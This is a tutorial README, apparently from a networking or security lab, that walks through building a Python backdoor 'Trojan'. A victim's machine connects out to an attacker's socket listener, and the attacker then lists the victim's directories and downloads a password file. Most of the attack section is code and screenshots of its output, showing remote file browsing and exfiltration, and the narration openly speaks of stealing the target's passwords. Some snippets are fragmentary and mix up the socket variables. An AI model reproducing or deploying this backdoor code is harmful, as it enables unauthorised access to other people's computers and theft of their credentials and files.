# Back door attack AAA
in this topology we are going to use python scripts as a Trajon to create a back door on the victim computer
to copy files from victim machine, delete files on this target, send file to this machine etc.


# :zap: How this works :zap: 
:star: Step 1: Firs, imagine that this target has downloaded a file from internet and inside this file there is a Trojan file that need to be 
executed to create a connection from target machine to our computer, then we are ready to go. 

in this topology, the computers are in different vlans, and we are going to create the back door from PC called Target to the hacker's computer called attacker. 

##
<img src=images/3.PNG  alt="alt text" width="950" height="550">

##


# :zap: Waiting for target to execute :zap: 

:star: Here the attacker by running this part of command start listening the to his port waiting for 
any incoming connection:


```python
import os
import socket

s = socket.socket()
host = socket.gethostname()
port = 8080

s.bind((host, port))


print (" ")
print (" Server is currently running @ ", host)
print (" ")
print (" Waiting for any incoming connection... ")


```
##
<img src=images/5.PNG  alt="alt text" width="950" height="550">

##

:star: In this photo we can see that the attacker has executed the python script and is waiting.

# :zap: Target executes our python script :zap:

:star: Step 2: Imagine the target has downloaded an executable file like a free application that our attacker uploaded befor from internet,
now he want to install that application that contains our Trojan, so when he executes our file, our python script start working. 
it asks the server name, we put the server's name [DESKTOP-E80I7RR] and the connection will be created between these two machines.
as the result you can see ``` Connected to the server successfully ``` on CLI of the target PC.

```python
#!/usr/bin/python
import os
import socket

s = socket.socket()
port = 8080
host = "127.0.0.1"
host = input (str("Please enter the server address : "))


s.connect((host,port))

print (" ")
print (" Connected to the server successfully")
print (" ")

```
##
<img src=images/10.PNG  alt="alt text" width="950" height="550">

##

# :zap: Connection on attacker's pc :zap:

:star: As soon as the script is executed the attacker's machin will receive access to the CLI of the Target PC, and now we
are ready to go. It shows us to which IP address is connected and on wich port as is shown on the next photo by running this part of program. 

```python
s.listen(1)
conn, addr = s.accept()
print("")
print (addr, "Has connected to the server successfully ")

```

##
<img src=images/7.PNG  alt="alt text" width="950" height="550">

##

:star: Let's see on the Target PC, in which directory we are working by running the command ``` view_cwd ```to run the next part 
of our script:


```python
while 1:
    
    command = s.recv(1024)
    command = command.decode()
    print (" ")

    if command == "view_cwd":

        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print ("Command has been executed successfully...")

```

##
<img src=images/9.PNG  alt="alt text" width="950" height="550">

##

And we can find out where we are ```command output : C:\Users\mrgt7\Desktop\My-Documents\test ```


:star: Let's see which files and directories the Target PC has in for example ``` C ``` directory by running this part
of our program using ``` Custom_Dir ``` command and then choosing ``` c:\\ ```:

```python
    elif command == "custom_dir":
        conn.send(command.encode())
        print (" ")
        user_input = input(str("Custom_Dir: "))
        conn.send(user_input.encode())
        print("")
        print("Command has been sent")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Custom Dir Result : ", files)
        
```

        
##
<img src=images/11.PNG  alt="alt text" width="950" height="550">

##

:star: As you can see all directories are shown as the result of our command. 


##
:star: Let's see which files and directories the Target PC has in its ``` C:\Users\mrgt7\Desktop\My-Documents\test ``` directory
##
<img src=images/12.PNG  alt="alt text" width="950" height="550">

##

:star:We can check on our Target PC:

##
<img src=images/13.PNG  alt="alt text" width="950" height="550">

##

##
:star: Let's start downloading files from our target using ``` download_file  ``` command to run the following part of our program:
Here we want to steel his `MY-PASSWORD` file including all his password located on this path ```C:\Users\mrgt7\Desktop\My-Documents\documents```.

```python
    elif command == "download_file":
        conn.send(command.encode())
        print (" ")
        filepath = input(str("Please enter the file path including the filename : "))
        conn.send(filepath.encode())
        file = conn.recv(100000)
        print("")
        filename = input(str("Please enter a filename for the incoming file including the extention :"))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print (" ")
        print (filename, "Has been downloaded and saved ")
        print (" ")


```

#
:star: so first we execute ``` download_file ``` 
then we shoudl put the path and the file name with its extension ```C:\Users\mrgt7\Desktop\My-Documents\documents\MY-PASSWORD ``` 
then we wirte the path and name that we want to this file be saved in our pc in this case ```mytargetINFO.txt```.
and that's it. we got it.

##
<img src=images/14.PNG  alt="alt text" width="950" height="550">

##


